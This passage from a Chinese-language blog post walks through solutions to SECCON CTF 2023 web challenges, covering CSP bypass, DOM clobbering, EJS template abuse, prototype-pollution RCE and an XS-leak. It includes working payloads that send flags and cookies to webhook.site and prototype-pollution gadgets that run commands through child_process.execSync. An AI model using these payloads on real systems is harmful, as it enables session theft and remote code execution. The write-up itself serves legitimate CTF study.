<span class="token punctuation">&#125;</span>

<span class="token keyword">const</span> <span class="token function-variable function">createSignature</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">header<span class="token punctuation">,</span> payload<span class="token punctuation">,</span> secret</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> data <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">stringifyPart</span><span class="token punctuation">(</span>header<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">stringifyPart</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> signature <span class="token operator">=</span> algorithms<span class="token punctuation">[</span>header<span class="token punctuation">.</span>alg<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> secret<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> signature<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>如果 <code>header.alg</code> 是 <code>constructor</code>，就會變成 <code>const signature = Object(data,secret)</code>，產出的結果會變成一個 string 的物件，而且裡面只含有 data，忽略了 secret：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">Object</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">,</span> <span class="token string">"secret"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// String &#123;'data'&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>因此只要根據這個構造一個相同的 signature 就好。</p>
<p>更詳細的 writeup 可以參考：<a target="_blank" rel="noopener" href="https://github.com/xryuseix/CTF_Writeups/tree/master/SECCON2023">https://github.com/xryuseix/CTF_Writeups/tree/master/SECCON2023</a></p>
<h3><span id="simplecalc-23-solves">SimpleCalc (23 solves)</span></h3><p>這題可以讓你執行任意 JavaScript，但是必須使用 fetch 加上 X-FLAG 這個 header 才能拿到 flag，可是會被 CSP 擋住：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> js_url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">http://</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>req<span class="token punctuation">.</span>hostname<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token constant">PORT</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/js/index.js</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  res<span class="token punctuation">.</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Content-Security-Policy'</span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">default-src </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>js_url<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string"> 'unsafe-eval';</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>只要製造出一個 header too large 的 response 並用 iframe 嵌入，就能得到一個沒有 CSP 的 same-origin 頁面，繞過 CSP：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> f<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'iframe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
f<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">http://localhost:3000/js/index.js?q=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token string">'a'</span><span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span><span class="token number">20000</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>
f<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    
    f<span class="token punctuation">.</span>contentWindow<span class="token punctuation">.</span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">headers</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token string-property property">'X-FLAG'</span><span class="token operator">:</span> <span class="token string">'a'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token literal-property property">credentials</span><span class="token operator">:</span><span class="token string">'include'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=></span> res<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">flag</span> <span class="token operator">=></span> location<span class="token operator">=</span><span class="token string">'https://webhook.site/2ba35f39-faf4-4ef2-86dd-d85af29e4512?q='</span><span class="token operator">+</span>flag<span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>有趣的是如果用 <code>window.open</code> 就不行，看賽後討論是有人說因為 window.open 會把錯誤頁面導到一個 <code>chrome://error</code> 之類的地方，所以 origin 會變成 null。</p>
<p>而這題的預期解其實是 service worker，在 http + localhost 底下是可以用 sw 的，靠著 service worker 把 CSP header 拿掉。</p>
<p>底下是 @DimasMaulana 的 exploit：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> quote

target <span class="token operator">=</span> <span class="token string">"http://localhost:3000"</span>
webhook <span class="token operator">=</span> <span class="token string">"https://webhook.site/9a2fbf03-9a64-49d1-9418-3728945d5e10"</span>
rmcsp <span class="token operator">=</span> <span class="token triple-quoted-string string">"""
self.addEventListener("fetch", (ev) => &#123;
    console.log(ev)
    let headers = new Headers()
    headers.set("Content-Type","text/html")
    if (/\/js\//.test(ev.request.url))&#123;
        ev.respondWith(new Response("&lt;script>fetch('/flag',&#123;headers:&#123;'X-FLAG':'1'&#125;,credentials:'include'&#125;).then(async r=>&#123;location='"""</span><span class="token operator">+</span>webhook<span class="token operator">+</span><span class="token triple-quoted-string string">"""?'+await r.text()&#125;)&lt;/script>",&#123;headers&#125;))
    &#125;
&#125;);
console.log("registered2")
document = &#123;&#125;
document.getElementById = ()=>&#123;return &#123;innerText:"testing"&#125;&#125;
"""</span>

workerUrl <span class="token operator">=</span> <span class="token string">"/js/index.js?expr="</span><span class="token operator">+</span>quote<span class="token punctuation">(</span>rmcsp<span class="token punctuation">)</span>

payload <span class="token operator">=</span> <span class="token string">"navigator.serviceWorker.register('"</span><span class="token operator">+</span>workerUrl<span class="token operator">+</span><span class="token string">"');setInterval(()=>&#123;location='/js/test'&#125;,2000)"</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
payload <span class="token operator">=</span> target<span class="token operator">+</span><span class="token string">"/js/..%2f?expr="</span><span class="token operator">+</span>quote<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3><span id="blink-14-solves">blink (14 solves)</span></h3><p>這題的核心程式碼如下：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token function-variable function">createBlink</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">html</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> sandbox <span class="token operator">=</span> <span class="token function">wrap</span><span class="token punctuation">(</span>
    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#viewer"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"iframe"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">// I believe it is impossible to escape this iframe sandbox...</span>
  sandbox<span class="token punctuation">.</span>sandbox <span class="token operator">=</span> sandboxAttribute<span class="token punctuation">;</span>

  sandbox<span class="token punctuation">.</span>width <span class="token operator">=</span> <span class="token string">"100%"</span><span class="token punctuation">;</span>
  sandbox<span class="token punctuation">.</span>srcdoc <span class="token operator">=</span> html<span class="token punctuation">;</span>
  <span class="token keyword">await</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">(</span>sandbox<span class="token punctuation">.</span>onload <span class="token operator">=</span> resolve<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">const</span> target <span class="token operator">=</span> <span class="token function">wrap</span><span class="token punctuation">(</span>sandbox<span class="token punctuation">.</span>contentDocument<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>
  target<span class="token punctuation">.</span>popover <span class="token operator">=</span> <span class="token string">"manual"</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> id <span class="token operator">=</span> <span class="token function">setInterval</span><span class="token punctuation">(</span>target<span class="token punctuation">.</span>togglePopover<span class="token punctuation">,</span> <span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token function">clearInterval</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>
    sandbox<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>iframe 的地方沒辦法 bypass sandbox，但重點是 <code>setInterval(target.togglePopover, 400)</code> 這一行程式碼。</p>
<p>如果 <code>target.togglePopover</code> 是字串的話，就可以拿來當成 eval 用。</p>
<p>而 <code>target</code> 是 <code>sandbox.contentDocument.body</code>，可以用 <code>name</code> 去 DOM clobber <code>document.body</code>，接著再去 clobber <code>togglePopover</code> 就搞定了。</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>body</span> <span class="token attr-name">srcdoc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;a id=togglePopover href=a:fetch(`http://webhook.site/2ba35f39-faf4-4ef2-86dd-d85af29e4512?q=$&#123;document.cookie&#125;`)>&lt;/a><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3><span id="eeeeejs-12-solves">eeeeejs (12 solves)</span></h3><p>遺憾的一題，試了很久但沒有解開 QQ</p>
<p>這題的核心程式碼如下：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> ejs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"ejs"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> <span class="token punctuation">&#123;</span> filename<span class="token punctuation">,</span> <span class="token operator">...</span>query <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
ejs<span class="token punctuation">.</span><span class="token function">renderFile</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> query<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>console<span class="token punctuation">.</span>log<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>你可以控制 <code>filename</code> 跟 <code>query</code>，目標是 XSS。</p>
<p>而 CSP 是 self，意思就是只要做出 <code>&lt;script src=/&gt;</code> 跟建構出一個合法的 JS 程式碼就可以拿到 flag 了。</p>
<p>但這邊另一個限制是只能讀取 <code>src</code> 底下的檔案，所以你的 template 是有限的。</p>
<p>而解法是利用 EJS 的 options <code>openDelimiter</code>、<code>closeDelimiter</code> 以及 <code>delimiter</code>，讓 EJS 用不同的方式去解析模板。</p>
<p>因為在 EJS 裏面 <code>&lt;%=</code> 可以輸出後面接的內容，而 <code>&lt;%-</code> 則是可以輸出 unescaped 的內容，所以我一開始的想法是找到符合這種 pattern 的字串，到最後只找到了一半，可以做出 <code>&lt;script&gt;</code> 但是屬性內容會被編碼，也找到了合法的 JavaScript 產生方式，總之最後沒做出來。</p>
<p>賽後看了一下其他人的解法，才意識到我忘記了這題是呼叫 node.js 以後輸出，作者的解法是把 debug 設成 true，就可以讓 EJS 輸出 src，而 src 會包含 filename，再利用 filename 可以是一個 object 的特性來傳入任意內容。</p>
<p>或是也可以直接把 <code>console.log(src)</code> 放到 template 裡面去。</p>
<p>舉例來說，有一段文字如下：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span>opts<span class="token punctuation">.</span>debug<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>src<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>opts<span class="token punctuation">.</span>compileDebug <span class="token operator">&amp;&amp;</span> opts<span class="token punctuation">.</span>filename<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  src <span class="token operator">=</span> src <span class="token operator">+</span> <span class="token string">"\n//# sourceURL="</span> <span class="token operator">+</span> sanitizedFilename <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">// other codes</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>當我們這樣做以後：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">ejs<span class="token punctuation">.</span><span class="token function">renderFile</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
  <span class="token string-property property">'src'</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    <span class="token literal-property property">helllo</span><span class="token operator">:</span> <span class="token string">'world'</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token literal-property property">settings</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    <span class="token string-property property">'view options'</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
      <span class="token literal-property property">delimiter</span><span class="token operator">:</span> <span class="token string">' '</span><span class="token punctuation">,</span>
      <span class="token literal-property property">openDelimiter</span><span class="token operator">:</span> <span class="token string">'if (opts.debug)'</span><span class="token punctuation">,</span>
      <span class="token literal-property property">closeDelimiter</span><span class="token operator">:</span> <span class="token string">" if (opts.compileDebug &amp;&amp; opts.filename)"</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">r</span> <span class="token operator">=></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>輸出會是：</p>
<pre class="line-numbers language-none"><code class="language-none">&#123; helllo: &#39;world&#39; &#125;
   &#123;
    src &#x3D; src + &quot;\n&#x2F;&#x2F;# sourceURL&#x3D;&quot; + sanitizedFilename + &quot;\n&quot;;
  &#125;
  &#x2F;&#x2F; other codes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>之所以會這樣，是因為把 delimiter 改掉以後，上面那段文字就等同於是：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>src<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span> <span class="token operator">%</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>
    src <span class="token operator">=</span> src <span class="token operator">+</span> <span class="token string">"\n//# sourceURL="</span> <span class="token operator">+</span> sanitizedFilename <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token comment">// other codes</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>因此就等同於是執行了 <code>console.log(src)</code>，所以 src 就會出現在輸出裡面。</p>
<h3><span id="node-ppjail-5-solves">node-ppjail (5 solves)</span></h3><p>這題可以讓你污染 prototype 上面的東西，而且值可以是 function，但問題是不能污染已經有的屬性。</p>
<p>解法是觸發錯誤之後，去找 Node.js 底層會幹嘛，然後污染相對應的屬性。</p>
<p>一個簡單的範例是：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">prepareStackTrace</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'pwn'</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span>
Object<span class="token punctuation">.</span>toString<span class="token punctuation">.</span>arguments<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>輸出為：</p>
<pre class="line-numbers language-none"><code class="language-none">pwn
&#x2F;js&#x2F;pp.js:4
Object.toString.arguments
                ^

[TypeError: &#39;caller&#39;, &#39;callee&#39;, and &#39;arguments&#39; properties may not be accessed on strict mode functions or the arguments objects for calls to them]

Node.js v20.0.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>至於要怎麼找出這屬性，學 <a target="_blank" rel="noopener" href="https://blog.maple3142.net/2023/09/17/seccon-ctf-2023-quals-writeups/#sandbox">maple</a> 去 patch V8 似乎是個不錯的選擇。</p>
<p>而作者則是有找到另外兩種方法，在這邊留個紀錄以後比較好找，來源是<a target="_blank" rel="noopener" href="https://blog.arkark.dev/2023/09/21/seccon-quals/">作者的 writeup</a>：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">solve1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>
    <span class="token comment"># Solution 1:</span>
    <span class="token keyword">return</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
        <span class="token string">"__proto__"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>
            <span class="token comment"># ref. https://github.com/nodejs/node/blob/v20.6.0/lib/internal/fixed_queue.js#L81</span>
            <span class="token comment"># ref. https://github.com/nodejs/node/blob/v20.6.0/lib/internal/process/task_queues.js#L77</span>
            <span class="token string">"1"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>
                <span class="token string">"callback"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>
                    <span class="token string">"__custom__"</span><span class="token punctuation">:</span> <span class="token boolean">True</span><span class="token punctuation">,</span>
                    <span class="token string">"type"</span><span class="token punctuation">:</span> <span class="token string">"Function"</span><span class="token punctuation">,</span>
                    <span class="token string">"args"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>
                        <span class="token string-interpolation"><span class="token string">f"console.log(global.process.mainModule.require('child_process').execSync('</span><span class="token interpolation"><span class="token punctuation">&#123;</span>command<span class="token punctuation">&#125;</span></span><span class="token string">').toString())"</span></span>
                    <span class="token punctuation">]</span><span class="token punctuation">,</span>
                <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">solve2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>
    <span class="token comment"># Solution 2:</span>
    <span class="token keyword">return</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
        <span class="token string">"__proto__"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>
            <span class="token comment"># ref. https://github.com/nodejs/node/blob/v20.6.0/lib/internal/util/inspect.js#L1064</span>
            <span class="token string">"circular"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>
                <span class="token string">"get"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>
                    <span class="token string">"__custom__"</span><span class="token punctuation">:</span> <span class="token boolean">True</span><span class="token punctuation">,</span>
                    <span class="token string">"type"</span><span class="token punctuation">:</span> <span class="token string">"Function"</span><span class="token punctuation">,</span>
                    <span class="token string">"args"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>
                        <span class="token string-interpolation"><span class="token string">f"console.log(global.process.mainModule.require('child_process').execSync('</span><span class="token interpolation"><span class="token punctuation">&#123;</span>command<span class="token punctuation">&#125;</span></span><span class="token string">').toString())"</span></span>
                    <span class="token punctuation">]</span><span class="token punctuation">,</span>
                <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
            <span class="token comment"># ref. https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Error/cause</span>
            <span class="token string">"cause"</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        <span class="token comment"># Cause an error</span>
        <span class="token string">"toString"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>
            <span class="token string">"caller"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3><span id="deno-ppjail-2-solves">deno-ppjail (2 solves)</span></h3><p>跟上一題類似，但是是要找 deno 的 gadget。</p>
<p>作者找到的 gadget 是 <code>Object.prototype.return</code></p>
<p>而 maple 找到的是 cause + circular.get，@parrot409 找到的是 <code>nodeProcessUnhandledRejectionCallback</code></p>
<p>更詳細的說明可以參考 maple 的 writeup：<a target="_blank" rel="noopener" href="https://blog.maple3142.net/2023/09/17/seccon-ctf-2023-quals-writeups/#deno-ppjail">https://blog.maple3142.net/2023/09/17/seccon-ctf-2023-quals-writeups/#deno-ppjail</a></p>
<h3><span id="hidden-note-1-solve">hidden-note (1 solve)</span></h3><p>這題也很有趣，題目就是經典的那種 XS leaks 的類型，有搜尋功能，只是搜尋結果會把 flag 給 filter 掉。</p>
<p>搜尋結果的頁面可以用 meta redirect 洩漏出來，所以是可以看到結果頁面的。只是結果頁面已經把 flag 去掉了，那還可以做些什麼呢？</p>
<p>在搜尋的時候，會把結果先排序，排序完以後再把 flag 去掉，而這一題所使用的排序方法在元素 &lt;&#x3D; 12 個的時候會是 stable sort，&gt;12 個就是 unstable sort。</p>
<p>因此，我們可以先建立恰好 12 個 note，內容為：<code>ECCON&#123;@|ECCON&#123;a|ECCON&#123;b|...</code></p>
<p>假如 flag 是 <code>SECCON&#123;abc&#125;</code> 好了，在搜尋 <code>ECCON&#123;@</code> 時，因為總數是 12 個，所以是 stable sort，最後搜尋結果頁面的 id 順序不會變。</p>
<p>但如果是搜尋 <code>ECCON&#123;a</code>，結果就變成 13 個，此時變成 unstable sort，note 的順序變了。</p>
<p>因此，可以從結果頁面的內容知道原始搜尋的結果是 12 個以內還是超過 12 個，就可以把這個當作 oracle，進而 leak 出 flag。</p>
<p>這個解法真的很酷，非常新穎！無論是出題的 Ark 還是解開的 maple，都真的好強</p>

    
    </div>
    
    <div class="columns is-variable is-1 is-multiline is-mobile">
    
        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/Security/">#Security</a></span>
    
    </div>
    
    
    <div class="columns is-mobile is-multiline article-nav">
        <span class="column is-12-mobile is-half-desktop is-hidden-mobile article-nav-prev">
            
        </span>
        <span class="column is-12-mobile is-half-desktop  article-nav-next">
            
            <a href="/2023/09/11/mp4-in-img-src/">原來 img src 也支援 mp4（Safari 限定）</a>
            
        </span>
    </div>
    
</article>




<div class="comments">
    <h3 class="title is-4">評論</h3>
    <script src="https://utteranc.es/client.js"
        repo="aszx87410/huli-blog"
        issue-term="title"
        theme="github-light"
        crossorigin="anonymous"
        async>
</script>
</div>

    </div>
</section>
    <footer class="footer">
    <div class="container">
        <div class="columns content">
            <div class="column is-narrow has-text-centered">
                &copy; 2023 Huli&nbsp;
                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
                        target="_blank" rel="noopener" href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
            </div>
            <div class="column is-hidden-mobile"></div>

            
            <div class="column is-narrow">
                <div class="columns is-mobile is-multiline is-centered">
                
                    
                <a class="column is-narrow" title="GitHub" target="_blank" rel="noopener" href="https://github.com/ppoffice/hexo-theme-minos">
                    
                    GitHub
                    
                </a>
                
                </div>
            </div>
            
            
<div class="column is-narrow has-text-centered">
    <div class="dropdown is-up is-right is-hoverable" style="margin-top: -0.2em;">
        <div class="dropdown-trigger">
            <button class="button is-small" aria-haspopup="true">
                <span class="icon">
                    <i class="fas fa-globe"></i>
                </span>
                <span>繁體中文</span>
                <span class="icon is-small">
            <i class="fas fa-angle-down" aria-hidden="true"></i>
          </span>
            </button>
        </div>
